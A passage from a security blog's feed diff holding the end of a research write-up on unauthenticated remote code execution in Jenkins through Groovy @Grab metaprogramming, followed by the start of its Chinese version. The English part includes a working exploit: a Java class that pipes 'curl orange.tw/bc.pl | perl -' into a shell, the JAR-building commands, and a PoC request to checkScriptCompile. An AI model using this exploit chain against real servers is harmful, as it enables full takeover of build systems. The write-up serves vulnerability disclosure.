+&lt;p&gt;How to fix this problem? It’s simple! Just go to &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; and remove the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It’s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;second-attempt&quot;&gt;Second Attempt&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;We continued reading the &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming manual&lt;/a&gt; and found another interesting annotation - &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;. There is no detailed information about &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; on the manual. However, we found another article - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt; on search engine!&lt;/p&gt;
+
+&lt;p&gt;Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.springframework&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;spring-orm&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;3.2.5.RELEASE&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By using &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt; proveded by &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; to execute arbitrary commands!&lt;/p&gt;
+
+&lt;p&gt;However, without a valid credential and &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;, we found another interesting annotation - &lt;code class=&quot;highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://maven.restlet.org/&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;1.1.6&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you are smart enough, you would like to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; parameter to a malicious website! Let’s try this in local environment:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
+@GrabResolver(name=&#39;restlet&#39;, root=&#39;http://orange.tw/&#39;)
+@Grab(group=&#39;org.restlet&#39;, module=&#39;org.restlet&#39;, version=&#39;1.1.6&#39;)
+import org.restlet
+&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-way-to-code-execution&quot;&gt;The Way to Code Execution&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?&lt;/p&gt;
+
+&lt;p&gt;By diving into &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape implementation on Groovy&lt;/a&gt;, we realized the library fetching is done by the class &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt;! We started to find is there any way we can leverage, and we noticed an interesting method &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;!&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&#39;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;JAR file is just a subset of ZIP format. In the &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;, Grape registers servies if there are some specified entry points. Among them, the &lt;code class=&quot;highlighter-rouge&quot;&gt;Runner&lt;/code&gt; interests me. By looking into the implementation of &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(…)&lt;/a&gt;, we found this:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here we see the &lt;code class=&quot;highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt;. Does it mean that we can call &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; on any class? Yes, so, we can just create a malicious JAR file, and put the class name into the file &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; and we can invoke the &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; and execute arbitrary code!&lt;/p&gt;
+
+&lt;p&gt;Here is the full exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Poc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Poc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+./Orange.java
+./Orange.class
+./META-INF
+./META-INF/services
+./META-INF/services/org.codehaus.groovy.plugins.Runners
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
+HTTP/1.1 200 OK
+Date: Sat, 02 Feb 2019 11:10:55 GMT
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;PoC:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
+?value=
+@GrabConfig(disableChecksums=true)%0a
+@GrabResolver(name=&#39;orange.tw&#39;, root=&#39;http://[your_host]/&#39;)%0a
+@Grab(group=&#39;tw.orange&#39;, module=&#39;poc&#39;, version=&#39;1&#39;)%0a
+import Orange;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Video:&lt;/p&gt;
+
+&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;) on Jenkins to protect the Pipeline, it’s useless because the vulnerability is in compile-time, not in run-time!&lt;/p&gt;
+
+&lt;p&gt;Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points &lt;code class=&quot;highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; I reported, after the vulnerability has been fixed, &lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; also found another &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;entry point&lt;/a&gt; quickly to trigger this vulnerability!&lt;/p&gt;
+
+&lt;p&gt;Apart from that, this vulnerability can also be chained with my previous exploit on &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P&lt;/p&gt;
+
+&lt;p&gt;Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</title>
+   <link href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/"/>
+   <updated>2019-02-19T00:00:00+08:00</updated>
+   <id>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;嗨! 大家今天過得好嗎?&lt;/p&gt;
+
+&lt;p&gt;這篇文章是 Hacking Jenkins 系列的下集! 給那些還沒看過上篇文章的同學，可以訪問下面鏈結，補充一些基本知識及了解之前如何從 Jenkins 中的動態路由機制到串出各種不同的攻擊鏈!&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing&lt;br /&gt;
+&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;如上篇文章所說，為了最大程度發揮漏洞的效果，想尋找一個代碼執行的漏洞可以與 ACL 繞過漏洞搭配，成為一個不用認證的遠端代碼執行! 不過在最初的嘗試中失敗了，由於動態路由機制的特性，Jenkins 在遇到一些危險操作時(如 &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)都會再次的檢查權限! 導致就算可以繞過最前面的 ACL 層依然無法做太多事情!&lt;/p&gt;
+
+&lt;p&gt;直到 Jenkins 在 2018-12-05 發佈的 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; 修復了前述我所回報的動態路由漏洞! 為了開始撰寫這份技術文章(Hacking Jenkins 系列文)，我重新複習了一次當初進行代碼審查的筆記，當中對其中一個跳板(gadget)想到了一個不一樣的利用方式，因而有了這篇故事! 這也是近期我所寫過覺得比較有趣的漏洞之一，非常推薦可以仔細閱讀一下!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
+&lt;hr /&gt;
+
